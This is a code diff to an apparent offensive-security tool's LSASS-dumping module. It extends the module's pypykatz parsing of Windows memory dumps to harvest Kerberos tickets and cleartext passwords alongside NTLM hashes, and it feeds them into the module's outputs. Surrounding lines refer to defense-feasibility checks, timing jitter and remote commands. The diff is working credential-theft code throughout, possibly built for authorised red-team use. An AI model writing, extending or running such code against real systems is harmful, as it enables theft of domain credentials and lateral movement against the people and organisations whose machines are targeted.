@@ -79,6 +79,10 @@ class LsassDumpModule(BaseModule):
     MODULE_TIMEOUT_SECONDS: int | None = 300  # seconds
     PARAMS_MODEL       = LsassDumpParams
 
+    def __init__(self, *args: Any, **kwargs: Any) -> None:
+        super().__init__(*args, **kwargs)
+        self._last_kerberos_tickets: list[dict[str, Any]] = []
+
     async def assess_feasibility(self, ctx: "Any") -> "FeasibilityReport":
         """
         Pre-flight Defense Feasibility Assessment:
@@ -461,7 +465,7 @@ class LsassDumpModule(BaseModule):
         }
 
         raw["ntlm_hashes"] = raw.get("hashes", [])  # OUTPUTS key
-        raw["kerberos_tickets"] = []  # OUTPUTS key
+        raw["kerberos_tickets"] = list(getattr(self, "_last_kerberos_tickets", []))  # OUTPUTS key
         await self.noise.jitter.sleep()
         return self._findings[:], raw
 
@@ -814,15 +818,23 @@ class LsassDumpModule(BaseModule):
         except Exception as exc:
             logger.debug("remote_cmd_failed", error=str(exc)[:80])
 
-    @staticmethod
-    def _parse_dump(dump_path: str) -> list[dict]:
-        """Parse LSASS dump with pypykatz."""
+    def _parse_dump(self_or_dump: Any, dump_path: str | None = None, raw: dict[str, Any] | None = None) -> list[dict]:
+        """Parse LSASS dump with pypykatz, extracting NTLM hashes and Kerberos tickets."""
+        if isinstance(self_or_dump, str) and dump_path is None:
+            dump_file = self_or_dump
+            instance = None
+        else:
+            instance = self_or_dump
+            dump_file = dump_path or ""
+
+        hashes: list[dict] = []
+        kerberos_tickets: list[dict] = []
         try:
             from pypykatz.pypykatz import pypykatz  # type: ignore[import]
-            mimi = pypykatz.parse_minidump_file(dump_path)
-            hashes: list[dict] = []
+            mimi = pypykatz.parse_minidump_file(dump_file)
             for luid in mimi.logon_sessions.values():
-                for cred in (luid.msv_creds or []):
+                # Extract MSV (NTLM) credentials
+                for cred in (getattr(luid, "msv_creds", None) or []):
                     nt = getattr(cred, "NThash", None)
                     if nt and nt != "31d6cfe0d16ae931b73c59d7e0c089c0":
                         hashes.append({
@@ -831,7 +843,37 @@ class LsassDumpModule(BaseModule):
                             "nt_hash":  nt,
                             "rid":      "",
                         })
-            return hashes
+                # Extract Kerberos credentials & tickets
+                for krb in (getattr(luid, "kerberos_creds", None) or []):
+                    tpath = getattr(krb, "ticket_path", "")
+                    kirbi = getattr(krb, "kirbi_hash", "") or getattr(krb, "kirbi_data", "")
+                    tickets = getattr(krb, "tickets", None)
+                    if tpath or kirbi:
+                        kerberos_tickets.append({
+                            "username": getattr(krb, "username", "") or getattr(luid, "username", ""),
+                            "domain": getattr(krb, "domainname", "") or getattr(luid, "domainname", ""),
+                            "ticket_path": tpath,
+                            "ticket_data": kirbi,
+                        })
+                    elif tickets:
+                        for t in tickets:
+                            t_path = getattr(t, "ticket_path", "") or getattr(t, "path", "")
+                            t_data = getattr(t, "kirbi_hash", "") or getattr(t, "kirbi_data", "") or getattr(t, "data", "")
+                            kerberos_tickets.append({
+                                "username": getattr(krb, "username", "") or getattr(luid, "username", ""),
+                                "domain": getattr(krb, "domainname", "") or getattr(luid, "domainname", ""),
+                                "ticket_path": t_path,
+                                "ticket_data": t_data,
+                                "service_name": getattr(t, "ServiceName", "") or getattr(t, "spn", ""),
+                            })
+                    elif getattr(krb, "password", None):
+                        hashes.append({
+                            "username": getattr(krb, "username", "") or getattr(luid, "username", ""),
+                            "domain": getattr(krb, "domainname", "") or getattr(luid, "domainname", ""),
+                            "password": getattr(krb, "password", ""),
+                            "nt_hash": "",
+                            "rid": "",
+                        })
         except ImportError:
             logger.warning("pypykatz_not_installed",
                            hint="pip install pypykatz")
@@ -839,3 +881,13 @@ class LsassDumpModule(BaseModule):
         except Exception as exc:
             logger.warning("pypykatz_parse_failed", error=str(exc)[:100])
             return []
+
+        if instance is not None:
+            if hasattr(instance, "_last_kerberos_tickets"):
+                instance._last_kerberos_tickets = kerberos_tickets
+            elif not isinstance(instance, type):
+                setattr(instance, "_last_kerberos_tickets", kerberos_tickets)
+
+        if raw is not None:
+            raw["kerberos_tickets"] = kerberos_tickets
+        return hashes
